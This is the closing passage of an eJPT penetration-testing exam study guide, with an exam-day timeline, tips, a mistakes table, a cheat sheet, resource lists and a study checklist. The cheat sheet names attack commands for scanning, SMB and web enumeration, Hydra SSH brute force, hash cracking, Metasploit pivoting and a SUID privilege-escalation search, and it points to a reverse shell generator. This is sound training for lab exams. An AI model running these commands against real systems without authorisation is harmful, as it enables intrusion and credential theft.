`- Download any provided files (users.txt, password.txt, pcap, etc.)`\
`- Read all 45 questions, build the question map (Step 1 above)`\
\
`Hour 0.25–0.5`\
`- ip a s to find your own IP`\
`- Host discovery: netdiscover -r <range> / nmap -sn <range>`\
\
`Hour 0.5–1`\
`- Full Nmap scan on every live host, saved to file`\
`- Slot each host into the question map`\
\
`Hour 1–3`\
`- Answer every question the Nmap output already gives directly`\
\
`Hour 3–8`\
`- Enumerate deeper: SMB, HTTP, FTP — whatever's open`\
`- Brute-force where a username is known but not a password`\
\
`Hour 8–15`\
`- Once a shell lands: whoami, ipconfig/ifconfig (check for pivoting),`\
`  hunt for credentials, work through the question map for that host`\
\
`Hour 15–20`\
`- Remaining questions, privilege escalation, hash dumps`\
\
`Hour 20–24`\
`- Review every answer against the actual question text one more time`\
`- Re-check anything uncertain`\
`- Submit`

48 hours is the hard limit, but most candidates finish well under 24
with this approach --- there's no need to feel pressure to use all of
it.

### Other Exam-Day Tips

1.  **The questions are hints** --- read each one as an instruction, not
    just something to answer at the end.
2.  **Enumerate before attacking.** Note everything before trying to
    exploit anything.
3.  **Break every 2 hours.** A tired brain re-reads the same question
    five times and still misses it.
4.  **Don't sink more than about an hour into one thing without
    re-checking the question.** Move on and come back later.
5.  **Write down credentials the moment they're found.**
6.  **Screenshot anything important**, for personal reference.
7.  **Always save Nmap output to a file** --- it gets reopened
    constantly.
8.  **rockyou.txt cracks more than you'd expect** --- try it before
    reaching for anything fancier.

### Common Mistakes to Avoid

  -----------------------------------------------------------------
  Mistake                          Fix
  -------------------------------- --------------------------------
  Scanning only the top 1000 ports Always run `-p-` for the full
                                   65535

  Not reading the questions        The questions are the roadmap
  properly                         --- read them as instructions,
                                   not a checklist to skim

  Attacking unusual ports first    Start with the common ones: 21,
                                   22, 80, 445, 3306, 3389

  Watching a walkthrough at the    Try for real first; only look
  first sign of difficulty         something up after \~30 genuine
                                   minutes stuck

  No per-host notes                Keep the table above running for
                                   every machine, the whole exam

  Skipping breaks                  Every 2 hours, step away ---
                                   even 10 minutes helps

  Assuming the "obvious" deeper    Re-read the question before
  path is required                 committing an hour to full
                                   privesc, pivoting, etc. --- it
                                   sometimes wants something much
                                   simpler

  Forgetting to check for pivoting After every shell, run
                                   `ipconfig` or `ifconfig`. Two
                                   network interfaces = hidden
                                   network
  -----------------------------------------------------------------

------------------------------------------------------------------------

## PART 12: Quick-Reference Cheat Sheet

The full command reference lives in the companion file,
`eJPT_Exam_Cheat_Sheet.md` --- keep it open in a second tab during the
exam. Condensed version, if only the essentials are needed:

`HOST DISCOVERY:  nmap -sn <range>  |  netdiscover -r <range>`\
`PORT SCAN:       nmap -sV -sC -O -p- -oN scan.txt <ip>`\
`SMB:             enum4linux -a <ip>  |  smbclient -L <ip>`\
`WEB:             gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt  |  nikto -h http://<ip>`\
`METASPLOIT:      msfconsole → search → use → set RHOSTS/LHOST/LPORT → exploit`\
`BRUTE FORCE:     hydra -l admin -P rockyou.txt ssh://<ip>`\
`HASH CRACK:      john --wordlist=rockyou.txt hash.txt`\
`PIVOT:           run autoroute -s <subnet>/24 → socks_proxy → proxychains nmap ...`\
`LINUX PRIVESC:   sudo -l  |  find / -perm -4000 -type f 2>/dev/null`

------------------------------------------------------------------------

## PART 13: After the Exam

1.  **Instant result** --- the score appears as soon as you submit.
2.  **Certificate** --- digital certificate plus badge.
3.  **Blockchain-verified** --- safe to add directly to LinkedIn.
4.  **Valid for 3 years** from the date it's issued. Renewal options
    include earning CPEs or achieving more advanced INE certifications.

------------------------------------------------------------------------

## Recommended Learning Resources

### Structured courses/paths:

- **TryHackMe --- Jr Penetration Tester path**:
  tryhackme.com/path/outline/jrpenetrationtester (rebuilt 2026 --- see
  the note in Part 10 on scope vs. eJPT)
- **INE Security --- Penetration Testing Student (PTS)** course: the
  official eJPT prep course, most directly matched to what's tested.
  ine.com/security/certifications/ejpt-certification
- **HackTheBox --- Starting Point** track (free tier, Tier 0/1 machines)

### YouTube channels

Search the channel name plus the topic, rather than relying on any
single pinned video. Channels stay current; individual video links go
stale:

  -----------------------------------------------------------------
  Channel                          Best for
  -------------------------------- --------------------------------
  NetworkChuck                     Linux fundamentals, networking
                                   concepts, beginner-friendly
                                   explainers

  HackerSploit                     Nmap, enumeration, general
                                   pentesting walkthroughs

  The Cyber Mentor (TCM Security)  Metasploit, practical ethical
                                   hacking methodology

  John Hammond                     Pivoting, CTF walkthroughs, tool
                                   breakdowns

  IppSec                           Deep-dive HackTheBox/TryHackMe
                                   walkthroughs --- best used
                                   *after* attempting the box
                                   yourself

  freeCodeCamp                     Long-form full courses (Linux,
                                   networking basics)
  -----------------------------------------------------------------

### Free written references:

- **GTFOBins** --- SUID/sudo privilege escalation lookups
- **HackTricks** --- broad pentesting methodology reference
- **revshells.com** --- reverse shell generator

------------------------------------------------------------------------

## A Word of Encouragement

Anyone who clears this exam quickly has usually put in real practice
before exam day, even when it's not obvious from the outside. Time
already spent on TryHackMe rooms and CTFs carries over directly --- eJPT
is an entry-level exam, and INE built it to be passable with solid
fundamentals and a methodical approach, not to be a trap.

Walk in with your notes, your cheat sheet, and the question-mapping
method above, and work it the same way every lab before this one has
already been worked.

You will get stuck. You will feel like you don't know enough. That's
normal. The people who pass aren't the ones who never get stuck ---
they're the ones who keep going, re-read the questions, and trust their
notes.

------------------------------------------------------------------------

## Daily Study Checklist

`[ ] 3–4 hours of dedicated study time`\
`[ ] 1–2 videos watched`\
`[ ] 1–2 labs completed (TryHackMe / HackTheBox)`\
`[ ] Notes written up (Notion / OneNote / plain text — doesn't matter which)`\
`[ ] New commands practiced`\
`[ ] Previous material revised`\
`[ ] Attempted it solo before watching any walkthrough`

------------------------------------------------------------------------

*Work through this guide, trust the process, and use the
question-mapping method from Part 11 on exam day --- that combination is
what actually gets people through eJPT. Good luck.*
